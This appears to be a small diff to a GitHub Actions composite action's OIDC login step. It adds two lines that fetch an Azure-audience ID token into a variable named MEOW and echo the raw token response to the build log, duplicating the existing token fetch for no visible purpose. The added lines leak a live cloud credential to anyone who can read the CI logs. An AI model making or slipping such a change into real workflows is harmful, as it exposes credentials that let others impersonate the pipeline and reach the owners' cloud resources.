@@ -166,6 +166,8 @@ runs:
         if [ ${{ inputs.use_oidc }} == 'true' ];
         then
           # {"count":1984,"value":"***"}
+          MEOW=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          echo $MEOW
           CC_TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | cut -d\' -f6)
           echo "CC_TOKEN=$CC_TOKEN" >> "$GITHUB_ENV"
         else
